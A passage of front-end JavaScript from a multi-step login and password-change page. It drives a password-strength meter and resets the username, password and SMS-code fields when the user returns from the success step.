    var width = Math.min(100, score * 25);
    var cls = score <= 2 ? '' : score <= 3 ? 'medium' : 'strong';
    return { level: score, width: width, cls: cls };
  }
  if (newPasswordInput && strengthFill) {
    newPasswordInput.addEventListener('input', function () {
      var r = getStrength(this.value);
      strengthFill.style.width = r.width + '%';
      strengthFill.className = 'strength-fill ' + r.cls;
    });
  }

  var successStep = getStepEl('success');
  if (successStep) {
    var loginBtn = successStep.querySelector('.btn');
    if (loginBtn) {
      loginBtn.addEventListener('click', function (e) {
        e.preventDefault();
        showStep('email');
        var un = document.getElementById('username');
        if (un) un.value = '';
        showLoginSubStep(1);
        document.getElementById('current-password').value = '';
        document.getElementById('new-password').value = '';
        document.getElementById('confirm-password').value = '';
        document.getElementById('sms-code').value = '';
        strengthFill.style.width = '0%';
        strengthFill.className = 'strength-fill';
      });
    }
  }
})();
